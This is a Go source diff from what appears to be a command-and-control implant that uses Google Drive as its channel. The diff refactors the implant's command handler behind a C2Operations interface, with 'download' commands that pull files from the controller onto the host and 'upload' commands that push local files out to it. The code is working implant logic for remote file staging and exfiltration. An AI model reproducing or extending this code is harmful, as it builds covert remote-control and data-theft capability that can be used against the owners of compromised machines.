@@ -7,11 +7,11 @@ import (
 	"os/exec"
 	"runtime"
 	"strings"
-
-	"google.golang.org/api/drive/v3"
 )
 
-func execute(spreadSheet *configuration.SpreadSheet, clientDrive *drive.Service, lastCommand *configuration.Commands, commandToExecute string) {
+func commandExecution(c2 C2Operations, lastCommand *configuration.Commands) {
+
+	commandToExecute := lastCommand.Input
 
 	// Checking for download command
 	if strings.HasPrefix(commandToExecute, "download") {
@@ -20,9 +20,17 @@ func execute(spreadSheet *configuration.SpreadSheet, clientDrive *drive.Service,
 			fileDriveId := slittedCommand[1]
 			downloadPath := slittedCommand[2]
 			utils.LogDebug("New download command: FileId " + fileDriveId + " saving it to: " + downloadPath)
-			downloadErr := downloadFile(clientDrive, fileDriveId, downloadPath)
+			fileContent, downloadErr := c2.pullFile(fileDriveId)
 			if downloadErr != nil {
 				lastCommand.Output = downloadErr.Error()
+				return
+			} else {
+				lastCommand.Output = "File Downloaded"
+			}
+			downloadErr = safeFile(downloadPath, fileContent)
+			if downloadErr != nil {
+				lastCommand.Output = downloadErr.Error()
+				return
 			} else {
 				lastCommand.Output = "File Downloaded"
 			}
@@ -36,12 +44,12 @@ func execute(spreadSheet *configuration.SpreadSheet, clientDrive *drive.Service,
 		if len(slittedCommand) == 2 {
 			uploadFilePath := slittedCommand[1]
 			utils.LogDebug("New upload command: file path: " + uploadFilePath)
-			uploadErr := uploadFile(clientDrive, uploadFilePath, spreadSheet.DriveId)
+			uploadErr := c2.pushFile(uploadFilePath)
 
 			if uploadErr != nil {
 				lastCommand.Output = uploadErr.Error()
 			} else {
-				lastCommand.Output = fmt.Sprintf("File Uploaded to: https://drive.google.com/drive/u/0/folders/%s", spreadSheet.DriveId)
+				lastCommand.Output = fmt.Sprintf("File Uploaded")
 			}
 			return
 		}
